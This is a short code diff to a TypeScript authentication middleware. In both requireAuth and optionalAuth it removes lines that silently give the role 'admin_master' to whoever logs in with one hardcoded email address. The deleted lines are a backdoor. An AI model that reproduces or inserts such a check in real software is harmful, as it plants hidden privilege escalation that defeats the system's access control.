@@ -63,9 +63,6 @@ export const requireAuth = async (req: Request, res: Response, next: NextFunctio
     }
 
     const user = rows[0] as AuthenticatedUser;
-    if (user.email && user.email.toLowerCase().trim() === 'suprememidias.ok@gmail.com') {
-      user.role = 'admin_master';
-    }
     req.user = user;
     next();
   } catch {
@@ -94,9 +91,6 @@ export const optionalAuth = async (req: Request, _res: Response, next: NextFunct
     );
     if (rows.length > 0) {
       const user = rows[0] as AuthenticatedUser;
-      if (user.email && user.email.toLowerCase().trim() === 'suprememidias.ok@gmail.com') {
-        user.role = 'admin_master';
-      }
       req.user = user;
     }
   } catch {
